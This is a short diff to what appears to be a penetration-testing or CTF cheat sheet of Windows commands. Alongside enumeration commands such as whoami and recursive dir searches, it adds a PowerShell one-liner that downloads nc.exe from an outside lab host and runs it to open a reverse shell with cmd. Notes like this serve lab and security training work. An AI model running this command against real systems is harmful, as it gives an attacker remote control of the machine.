@@ -41,16 +41,20 @@
 
 <h3 id="various-commands">Various commands</h3>
 
-<p><pre><code>
+<pre><code>
 type
-get-content
+get-content 
 dir /ah
 whoami
 dir /s
 where /r c:\Windows bash.*
 START filenae.lnk
 where /r c:\ wsl.conf
-</pre></code></p>
+</pre></code>
+
+
+### Download and run reverse shell
+<pre>powershell "Invoke-WebRequest 'http://10.10.14.63:8000/nc.exe' -OutFile 'C:\Users\public\nc.exe'"; C:\Users\public\nc.exe -e cmd 10.10.14.63 8888</pre>
 
 <h3 id="how-to-download-file">How to download file</h3>
 
